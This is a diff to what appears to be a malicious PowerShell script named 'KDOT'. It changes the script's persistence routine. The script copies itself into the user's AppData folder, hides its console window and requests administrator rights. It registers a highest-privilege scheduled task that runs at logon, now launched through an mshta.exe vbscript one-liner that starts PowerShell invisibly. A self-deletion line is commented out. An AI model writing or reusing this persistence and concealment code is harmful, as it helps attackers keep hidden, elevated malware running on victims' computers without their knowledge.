@@ -220,11 +220,8 @@ function Invoke-TASKS {
     $origin = $PSCommandPath
     Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1"
-    $batch_code = "powershell -ExecutionPolicy Bypass -File $scriptPath"
-    $batch_path = "$env:APPDATA\KDOT\KDOT.bat"
-    Set-Content -Path $batch_path -Value $batch_code -Encoding ASCII -Force
     $task_name = "KDOT"
-    $task_action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $batch_path"
+    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell -file %appdata%\kdot\kdot.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
@@ -293,10 +290,10 @@ function Hide-Console
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
     Invoke-TASKS
-	Remove-Item $PSCommandPath -Force 
+    # Self-Destruct
+	# Remove-Item $PSCommandPath -Force 
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
 }
-
